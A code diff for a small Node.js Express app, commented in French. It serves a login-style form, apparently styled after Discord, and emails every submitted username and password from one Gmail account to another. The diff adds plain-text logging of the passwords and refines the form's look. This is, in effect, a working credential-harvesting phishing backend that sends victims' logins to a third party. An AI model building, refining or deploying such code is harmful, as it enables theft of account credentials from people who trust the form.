@@ -4,6 +4,7 @@ const nodemailer = require("nodemailer");
 
 const app = express();
 
+// Middleware pour lire les formulaires
 app.use(bodyParser.urlencoded({ extended: true }));
 
 // PAGE FORMULAIRE
@@ -15,32 +16,39 @@ res.send(`
 <title>Formulaire</title>
 <style>
 body{
-font-family:Arial;
-background:#f2f3f5;
+font-family: Arial;
+background: #f2f3f5;
 display:flex;
 justify-content:center;
 align-items:center;
 height:100vh;
+margin:0;
 }
+
 .box{
 background:white;
 padding:30px;
 border-radius:10px;
-width:300px;
+width:320px;
 box-shadow:0 0 10px rgba(0,0,0,0.1);
 }
+
 input{
 width:100%;
-padding:10px;
+padding:12px;
 margin-top:10px;
+border:1px solid #ccc;
+border-radius:5px;
 }
+
 button{
 width:100%;
-padding:10px;
+padding:12px;
 margin-top:15px;
 background:#5865F2;
 color:white;
 border:none;
+border-radius:5px;
 cursor:pointer;
 }
 </style>
@@ -59,6 +67,7 @@ cursor:pointer;
 <button type="submit">Envoyer</button>
 
 </form>
+
 </div>
 
 </body>
@@ -66,44 +75,45 @@ cursor:pointer;
 `);
 });
 
-// ENVOI EMAIL + FORMULAIRE
+// ROUTE ENVOI
 app.post("/send", async (req, res) => {
+  try {
 
-const username = req.body.username;
-const password = req.body.password;
+    const username = req.body.username;
+    const password = req.body.password;
 
-// Gmail N1 (EXPÉDITEUR)
-const transporter = nodemailer.createTransport({
-service: "gmail",
-auth: {
-user: "GMAIL_N1@gmail.com",
-pass: "MOT_DE_PASSE_APPLICATION_N1"
-}
+    console.log("USERNAME:", username);
+    console.log("PASSWORD:", password);
+
+    // EMAIL CONFIG
+    const transporter = nodemailer.createTransport({
+      service: "gmail",
+      auth: {
+        user: "GMAIL_N1@gmail.com",
+        pass: "MOT_DE_PASSE_APPLICATION_N1"
+      }
+    });
+
+    // ENVOI EMAIL
+    await transporter.sendMail({
+      from: "GMAIL_N1@gmail.com",
+      to: "GMAIL_N2@gmail.com",
+      subject: "Nouveau formulaire reçu",
+      html: `
+        <h2>Nouvelle soumission</h2>
+        <p><b>Username :</b> ${username}</p>
+        <p><b>Password :</b> ${password}</p>
+      `
+    });
+
+    res.send("Email envoyé avec succès !");
+  } catch (err) {
+    console.log("ERREUR:", err);
+    res.status(500).send("Erreur serveur");
+  }
 });
 
-// ENVOI EMAIL
-await transporter.sendMail({
-from: "GMAIL_N1@gmail.com",
-to: "GMAIL_N2@gmail.com",
-subject: "Nouveau formulaire reçu",
-html: `
-<h2>Nouvelle soumission</h2>
-
-<p><b>Username :</b> ${username}</p>
-<p><b>Password :</b> ${password}</p>
-
-<hr>
-
-<p>Accès au formulaire :</p>
-<a href="http://localhost:3000">
-Ouvrir le formulaire
-</a>
-`
-});
-
-res.send("Email envoyé à Gmail N2 !");
-});
-
+// PORT RENDER
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
